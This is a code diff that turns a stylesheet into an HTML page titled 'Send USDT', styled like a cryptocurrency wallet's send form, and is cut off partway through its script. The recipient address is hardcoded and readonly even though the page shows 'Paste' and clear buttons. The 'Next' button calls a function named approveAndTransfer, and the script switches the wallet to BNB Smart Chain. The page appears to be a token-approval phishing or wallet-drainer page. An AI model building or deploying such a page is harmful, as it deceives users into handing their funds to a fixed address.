@@ -1,105 +1,163 @@
-<style>
-  body {
-    font-family: 'Segoe UI', Tahoma, sans-serif;
-    margin: 0;
-    padding: 0;
-    background: #fff;
-    color: #333;
-  }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 
-  .container {
-    max-width: 480px;
-    margin: 0 auto;
-    padding: 25px 15px;
-  }
-
-  label {
-    display: block;
-    margin: 20px 0 6px;
-    color: #888;
-    font-size: 14px;
-  }
-
-  .input-wrapper,
-  .amount-wrapper {
-    position: relative;
-    display: flex;
-    align-items: center;
-    border: 1px solid #ddd;
-    border-radius: 4px; /* Chokor box */
-    background-color: #fff;
-    width: 100%;
-    box-sizing: border-box;
-  }
-
-  .input-wrapper input,
-  .amount-wrapper input {
-    border: none;
-    outline: none;
-    font-size: 16px;
-    padding: 12px 80px 12px 12px; /* Leave space for inside buttons */
-    width: 100%;
-    box-sizing: border-box;
-  }
-
-  .input-wrapper span,
-  .amount-wrapper span {
-    position: absolute;
-    right: 12px;
-    font-weight: bold;
-    color: #333;
-    font-size: 14px;
-    cursor: pointer;
-  }
-
-  .input-wrapper span:first-of-type {
-    right: 60px; /* ✕ */
-  }
-
-  .input-wrapper span:last-of-type {
-    right: 12px; /* Paste */
-  }
-
-  .amount-wrapper span:first-of-type {
-    right: 60px; /* USDT */
-  }
-
-  .amount-wrapper span:last-of-type {
-    right: 12px; /* Max */
-  }
-
-  .amount-line {
-    margin-top: 5px;
-    font-size: 14px;
-    color: #666;
-  }
-
-  .btn-center {
-    display: flex;
-    justify-content: center;
-  }
-
-  .btn-center button {
-    margin-top: 35px;
-    width: 100%;
-    padding: 15px;
-    font-size: 16px;
-    background-color: #002fff;
-    color: #fff;
-    font-weight: bold;
-    border: none;
-    border-radius: 6px; /* Chokor button */
-    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
-    cursor: pointer;
-  }
-
-  .btn-center button:active {
-    transform: scale(0.98);
-  }
-
-  @media (max-width: 600px) {
-    .container {
-      padding: 15px;
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #fff;
+      color: #333;
+      max-width: 100%;
+      overflow-x: hidden;
+      -webkit-user-select: none;
+      -webkit-touch-callout: none;
+      -webkit-tap-highlight-color: transparent;
     }
-  }
-</style>
+
+    .container {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 25px 15px;
+    }
+
+    label {
+      display: block;
+      margin: 20px 0 6px;
+      color: #888;
+      font-size: 14px;
+    }
+
+    .input-wrapper,
+    .amount-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      background-color: #fff;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    .input-wrapper input,
+    .amount-wrapper input {
+      border: none;
+      outline: none;
+      font-size: 16px;
+      padding: 12px 80px 12px 12px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    .input-wrapper span,
+    .amount-wrapper span {
+      position: absolute;
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      cursor: pointer;
+    }
+
+    .input-wrapper span:first-of-type {
+      right: 60px;
+    }
+
+    .input-wrapper span:last-of-type {
+      right: 12px;
+    }
+
+    .amount-wrapper span:first-of-type {
+      right: 60px;
+    }
+
+    .amount-wrapper span:last-of-type {
+      right: 12px;
+    }
+
+    .amount-line {
+      margin-top: 5px;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .btn-center {
+      display: flex;
+      justify-content: center;
+    }
+
+    .btn-center button {
+      margin-top: 35px;
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      background-color: #002fff;
+      color: #fff;
+      font-weight: bold;
+      border: none;
+      border-radius: 6px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.15);
+      cursor: pointer;
+    }
+
+    .btn-center button:active {
+      transform: scale(0.98);
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <label for="address">Address or Domain Name</label>
+    <div class="input-wrapper">
+      <input type="text" id="address" value="0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999" readonly>
+      <span onclick="clearAddress()">✕</span>
+      <span onclick="pasteAddress()">Paste</span>
+    </div>
+
+    <label for="amount">Amount</label>
+    <div class="amount-wrapper">
+      <input type="number" id="amount" placeholder="USDT Amount" oninput="updateFiat()" />
+      <span>USDT</span>
+      <span onclick="fillMax()">Max</span>
+    </div>
+
+    <div class="amount-line" id="fiat">≈ $0.00</div>
+
+    <div class="btn-center">
+      <button onclick="approveAndTransfer()">Next</button>
+    </div>
+  </div>
+
+  <script>
+    window.addEventListener("load", () => {
+      if (document.body.innerHTML.trim() === "") {
+        location.reload();
+      }
+    });
+
+    async function ensureBNBChain() {
+      if (window.ethereum) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }],
+          });
+        } catch (err) {
+          if (err.code === 4902) {
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
